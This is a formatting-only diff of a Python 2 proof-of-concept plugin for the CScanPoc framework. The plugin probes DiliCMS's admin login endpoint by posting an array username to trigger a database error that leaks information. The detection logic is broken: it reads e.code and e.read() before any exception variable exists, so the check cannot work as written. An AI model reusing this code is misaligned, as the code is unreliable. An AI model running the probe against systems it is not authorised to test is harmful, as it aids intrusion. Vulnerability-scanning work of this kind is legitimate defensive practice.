@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urllib
 import urllib2
 
+
 class Vuln(ABVuln):
-    vuln_id = 'DiliCMS_0001' # 平台漏洞编号，留空
+    vuln_id = 'DiliCMS_0001'  # 平台漏洞编号，留空
     name = 'DiliCMS 信息泄漏漏洞'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INFO_LEAK # 漏洞类型
+    type = VulnType.INFO_LEAK  # 漏洞类型
     disclosure_date = '2015-03-11'  # 漏洞公布时间
     desc = '''
         管理后台登录页面 /admin/login/do 信息泄漏。
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'DiliCMS'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '516447ea-5cfe-46fe-9838-9a7ddfcb9676'
@@ -32,22 +34,23 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             file_path = "/admin/login/do"
             verify_url = self.target + file_path
-            test_data = {'username[]':'xx','password':'xx'}
+            test_data = {'username[]': 'xx', 'password': 'xx'}
             test_data_urlencode = urllib.urlencode(test_data)
 
             req = urllib2.urlopen(verify_url, data=test_data_urlencode)
-            if e.code == 500 and "`username` =  Array</p>" in  e.read():
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+            if e.code == 500 and "`username` =  Array</p>" in e.read():
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
